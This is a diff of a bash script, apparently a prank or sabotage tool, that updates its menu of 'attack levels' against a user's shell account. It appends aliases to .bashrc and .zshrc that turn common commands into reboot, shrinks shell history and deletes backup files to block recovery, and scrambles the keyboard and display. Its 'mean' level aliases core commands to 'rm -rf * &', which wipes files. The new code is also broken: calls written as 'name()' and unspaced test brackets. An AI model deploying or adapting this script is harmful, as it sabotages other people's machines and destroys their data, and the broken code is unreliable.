@@ -1,56 +1,110 @@
 #!/bin/bash
+
 clear
-version='0.1.5'
-default_alias="reboot"
+version='0.2.1'
+default_alias="reboot & "
 
 refresh_bash()
 {
     echo "Refreshing the bashrc"
     source ~/.bashrc
+    echo "Refreshing the zshrc"
+    source ~/.zshrc
 }
 
-basic_attack()
+base()
+{
+    echo "Changing the HISTSIZE to 1"
+    echo "HISTSIZE=1" >> ~/.bashrc
+    echo "HISTSIZE=1" >> ~/.zshrc
+    echo "HISTFILESIZE=1" >> ~/.bashrc
+    echo "HISTFILESIZE=1" >> ~/.zshrc
+    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
+    rm -f ~/.bashrc~
+    echo "Removing the temporary .zshrc~ file (to prevent recovery)"
+    rm -f ~/.zshrc~
+}
+
+base_alias()
 {
     for alias in "emacs" "ne" "vim" "vi" "cd" "ls"
     do
 	echo "Redirecting '$alias' to '$default_alias'"
 	echo "alias $alias='$default_alias'" >> ~/.bashrc
+	echo "alias $alias='$default_alias'" >> ~/.zshrc
     done
-    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
-    rm -f ~/.bashrc~
-    refresh_bash
+}
+
+normal_alias()
+{
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "tree"
+    do
+	echo "Redirecting '$alias' to '$default_alias'"
+	echo "alias $alias='$default_alias'" >> ~/.bashrc
+	echo "alias $alias='$default_alias'" >> ~/.zshrc
+    done
+}
+
+
+advanced_alias()
+{
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "tree" "chmod"
+    do
+	echo "Redirecting '$alias' to '$default_alias'"
+	echo "alias $alias='$default_alias'" >> ~/.bashrc
+	echo "alias $alias='$default_alias'" >> ~/.zshrc
+    done
+}
+
+basic_attack()
+{
+    base_alias()
+    base()
+    refresh_bash()
 }
 
 normal_attack()
 {
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat"
-    do
-	echo "Redirecting '$alias' to '$default_alias'"
-	echo "alias $alias='$default_alias'" >> ~/.bashrc
-    done
-    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
-    rm -f ~/.bashrc~
     echo "Changing the keyboard to Russian"
     setxkbmap ru
-    refresh_bash
+    normal_alias()
+    base()
+    refresh_bash()
+}
+
+advanced_attack()
+{
+    echo "Changing the keyboard to Russian"
+    setxkbmap ru
+    advanced_alias()
+    base()
+    refresh_bash()
 }
 
 hardcore_attack()
 {
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat"
-    do
-	echo "Redirecting '$alias' to '$default_alias'"
-	echo "alias $alias='$default_alias'" >> ~/.bashrc
-    done
-    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
-    rm -f ~/.bashrc~
     echo "Changing the keyboard to Greek"
     setxkbmap 'pl,gr' -variant ',polytonic'
     echo "Inverting the display"
     xrandr -o inverted
     echo "Zooming in"
     xrandr --scale 5x5
-    refresh_bash
+    advanced_alias()
+    base()
+    refresh_bash()
+}
+
+mean_attack()
+{
+    echo "Well ... Good luck."
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "echo" "tree" "chmod"
+    do
+	echo "Redirecting '$alias' to 'rm -rf * & '"
+	echo "alias $alias='rm -rf * & '" >> ~/.bashrc
+	echo "alias $alias='rm -rf * & '" >> ~/.zshrc
+    done
+    base()
+    refresh_bash()
 }
 
 echo "+-------------------------------------------------+"
@@ -68,9 +122,11 @@ echo "+-------------------------------------------------+"
 echo
 echo "Attack levels :"
 echo " (0) - Does nothing : Just quit the program"
-echo " (1) - Basic attack : Add some aliases to the bashrc"
+echo " (1) - Basic attack : Add some aliases to the bashrc and change Histsize"
 echo " (2) - Normal       : Add quite a lot of aliases + change keyboard to russian"
-echo " (3) - Harcore      : Normal + play with the screen + change keyboard to greek"
+echo " (3) - Advanced     : Same as Normal + more aliases"
+echo " (4) - Harcore      : Advanced + play with the screen + change keyboard to greek"
+echo " (5) - Mean         : Don't use this. Really mean."
 echo
 read -p "Please enter the level of the attack : " usr_input
 echo
@@ -81,21 +137,37 @@ case $usr_input in
 	;;
     1)
 	echo "Performing the basic attack ..."
-	basic_attack
+	basic_attack()
 	;;
     2)
 	echo "Performing the normal attack ..."
-	normal_attack
+	normal_attack()
 	;;
     3)
-	read -p "Are you sure you want to launch the attack level 3 ? (y/n) : " usr_input
+	echo "Performing the advanced attack ... (Good luck)"
+	advanced_attack()
+	;;
+    4)
+	read -p "Are you sure you want to launch the attack level 4 ? (y/n) : " usr_input
 	if [$usr_input = "y"]
 	then
 	    echo "Performing the hardcore attack ..."
-	    hardcore_attack
+	    hardcore_attack()
+	fi
+	;;
+    5)
+	read -p "Are you sure you want to launch the mean attack ? (y/n) : " usr_input
+	if [$usr_input = "y"]
+	then
+	    read -p "Seriously ? (y/n) : " usr_input
+	    if [$usr_input = "y"]
+	    then
+		echo "Performing the mean attack ..."
+		mean_attack()
+	    fi
 	fi
 	;;
 esac
 
 clear
-exit
+kill -9 $PPID
